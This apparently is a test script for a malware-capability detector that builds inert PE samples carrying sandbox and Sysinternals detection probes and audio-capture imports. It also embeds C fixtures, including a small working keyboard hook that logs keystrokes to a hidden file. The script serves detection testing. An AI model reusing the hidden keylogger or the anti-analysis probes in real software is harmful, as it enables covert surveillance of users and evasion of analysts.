"""Run inert PE operand controls and source capability/hostile controls.

Usage: python3 testdata/taxonomy/reasoned-input-review/verify.py <scratch-dir>
Native entry points are RET. The probe functions are unreachable excerpts;
no original malware bytes or configuration are copied into these fixtures.
"""
import json
import os
from pathlib import Path
import struct
import subprocess
import sys

ROOT = Path(__file__).resolve().parents[3]
OUT = Path(sys.argv[1]).resolve()
OUT.mkdir(parents=True, exist_ok=True)
SANDBOX = 'objectives/anti-analysis/sandbox-detect/artifact/known::x86-sandboxie-module-presence-probe'
WINDOW = 'objectives/anti-analysis/tool-detect/process::x86-sysinternals-window-presence-probe'
AUDIO = 'micro-behaviors/hardware/input/audio::wave-input-capture-api-profile'
MIC = 'objectives/collection/multi-source::windows-keylogger-microphone-capture'
PROFILE = 'micro-behaviors/hardware/input/keyboard/hook::numeric-low-level-keyboard-hook-file-write-profile'
HIDDEN = 'objectives/collection/keylog/hook::numeric-low-level-keyboard-hook-hidden-file-logger'
HOOK = 'micro-behaviors/hardware/input/keyboard/hook::windows-keyboard-hook-install'
OLD = 'objectives/collection/keylog/hook::numeric-low-level-keyboard-hook-file-logger'


def image(wrong_module=False, wrong_api=False, wrong_class=False, no_audio=False):
    buf = bytearray(0x1400)
    buf[:2] = b'MZ'
    struct.pack_into('<I', buf, 0x3c, 0x80)
    buf[0x80:0x84] = b'PE\0\0'
    struct.pack_into('<HHIIIHH', buf, 0x84, 0x14c, 2, 1700000000, 0, 0, 224, 0x102)
    opt = 0x98
    struct.pack_into('<H', buf, opt, 0x10b)
    for off, value in [(4, 512), (8, 4096), (16, 0x1000), (28, 0x400000),
                       (32, 4096), (36, 512), (56, 0x3000), (60, 512), (92, 16)]:
        struct.pack_into('<I', buf, opt + off, value)
    struct.pack_into('<H', buf, opt + 68, 3)
    struct.pack_into('<II', buf, opt + 104, 0x2200, 80)
    for i, (name, rva, raw, size, flags) in enumerate([
        (b'.text', 0x1000, 0x200, 0x200, 0x60000020),
        (b'.rdata', 0x2000, 0x400, 0x1000, 0x40000040),
    ]):
        struct.pack_into('<8sIIIIIIHHI', buf, 0x178+i*40, name, size, rva,
                         size, raw, 0, 0, 0, 0, flags)
    def store(rva, data):
        off = 0x400 + rva - 0x2000
        buf[off:off+len(data)] = data
    for rva, data in [(0x2050, b'SbieDll.dll\0'), (0x2070, b'PROCMON_WINDOW_CLASS\0'),
                      (0x2090, b'PROCEXPL\0'), (0x20b0, b'ordinary.dll\0'),
                      (0x20d0, b'OrdinaryWindow\0')]:
        store(rva, data)
    libraries = [
        ('KERNEL32.dll', 0x2400, ['GetModuleHandleA', 'Sleep']),
        ('USER32.dll', 0x2420, ['FindWindowA', 'MessageBoxA']),
        ('WINMM.dll', 0x2440, ['waveInOpen', 'waveInPrepareHeader',
                             'waveInStart', 'waveOutAddBuffer' if no_audio else 'waveInAddBuffer']),
    ]
    cursor = 0x2500
    for i, (dll, iat, funcs) in enumerate(libraries):
        dll_rva = cursor
        store(cursor, dll.encode()+b'\0')
        cursor += len(dll)+1
        cursor = (cursor+1) & ~1
        store(0x2200+i*20, struct.pack('<IIIII', iat, 0, 0, dll_rva, iat))
        for j, name in enumerate(funcs):
            store(iat+j*4, struct.pack('<I', cursor))
            store(cursor, b'\0\0'+name.encode()+b'\0')
            cursor = (cursor+len(name)+4) & ~1
    buf[0x200] = 0xc3
    module = 0x4020b0 if wrong_module else 0x402050
    api = 0x402404 if wrong_api else 0x402400
    probe = b'\x68'+struct.pack('<I', module)+b'\xff\x15'+struct.pack('<I', api)+bytes.fromhex('85 c0 0f 95 c0 c3')
    buf[0x210:0x210+len(probe)] = probe
    for off, cls in [(0x240, 0x402070), (0x270, 0x402090)]:
        if wrong_class:
            cls = 0x4020d0
        probe = bytes.fromhex('6a 00 68')+struct.pack('<I', cls)+bytes.fromhex('ff 15')+struct.pack('<I', 0x402424 if wrong_api else 0x402420)+bytes.fromhex('85 c0 0f 95 c0 c3')
        buf[off:off+len(probe)] = probe
    return bytes(buf)


cases = []
def case(name, data, yes=(), no=()):
    p = OUT/name
    p.write_bytes(data)
    cases.append((p, set(yes), set(no)))

case('bound-probes-and-audio.exe', image(), [SANDBOX, WINDOW, AUDIO], [MIC])
case('unrelated-module.exe', image(wrong_module=True), [WINDOW, AUDIO], [SANDBOX, MIC])
case('unrelated-apis.exe', image(wrong_api=True), [AUDIO], [SANDBOX, WINDOW, MIC])
case('unrelated-window-class.exe', image(wrong_class=True), [SANDBOX, AUDIO], [WINDOW, MIC])
case('no-input-buffer.exe', image(no_audio=True), [SANDBOX, WINDOW], [AUDIO, MIC])
# Existing source fixture outside the review batch, byte-identical to the sample.
fixture = ROOT/'testdata/taxonomy/input-source/keyboard-hook-log.c'
case('incomplete-hook.c', fixture.read_bytes(), [PROFILE, HOOK], [OLD, HIDDEN])
case('window-hook.c', (fixture.parent/'window-hook.c').read_bytes(), [], [PROFILE, HOOK, OLD, HIDDEN])
# The output of this logger is deliberately concealed, unlike the reviewed
# incomplete fixture. The existing hostile rule must retain this population.
case('hidden-recording.c', b'''#include <windows.h>
HANDLE output;
LRESULT CALLBACK capture(int code, WPARAM kind, LPARAM payload) {
    DWORD count;
    if (code == HC_ACTION && kind == WM_KEYDOWN)
        WriteFile(output, (void *)payload, sizeof(KBDLLHOOKSTRUCT), &count, NULL);
    return CallNextHookEx(NULL, code, kind, payload);
}
int main(void) {
    output = CreateFileW(L"input.bin", GENERIC_WRITE, FILE_SHARE_READ, NULL,
                         CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    HHOOK hook = SetWindowsHookExW(13, capture, GetModuleHandleW(NULL), 0);
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0) > 0) DispatchMessageW(&msg);
    UnhookWindowsHookEx(hook);
    CloseHandle(output);
}
''', [PROFILE, HOOK, HIDDEN], [OLD])
# A hook's callback need not write the same-file application's status log.
case('unrelated-status-write.c', b'''#include <windows.h>
LRESULT CALLBACK dispatch(int code, WPARAM kind, LPARAM value) {
    return CallNextHookEx(NULL, code, kind, value);
}
void register_input(void) { SetWindowsHookExW(13, dispatch, NULL, 0); }
void status(HANDLE file) { DWORD n; WriteFile(file, "ready", 5, &n, NULL); }
''', [PROFILE, HOOK], [OLD, HIDDEN])

proc = subprocess.run([os.environ.get('CLEAVE', 'cleave'), '--traits-dir', str(ROOT),
                       '--disable', 'third-party,radare2', '--json',
                       *[str(p) for p, _, _ in cases]], capture_output=True, text=True)
if proc.returncode:
    raise RuntimeError(proc.stderr)
reports = [json.loads(line) for line in proc.stdout.split('\n') if line.strip()]
# Full JSONL reports expose files[].findings; tolerate a single-file envelope.
files = [f for report in reports for f in report.get('files', [report])]
for p, yes, no in cases:
    matched = [f for f in files if Path(f.get('path', '')).name == p.name]
    assert matched, (p.name, 'missing report')
    traits = {t.get('id'): t for f in matched for t in f.get('findings', f.get('traits', []))}
    assert yes <= traits.keys(), (p.name, 'missing', yes-traits.keys())
    assert not no & traits.keys(), (p.name, 'unexpected', no & traits.keys())
    print(p.name, 'PASS')
(OUT/'results.json').write_text(json.dumps({'cases': len(cases), 'passed': True}, indent=2)+'\n')
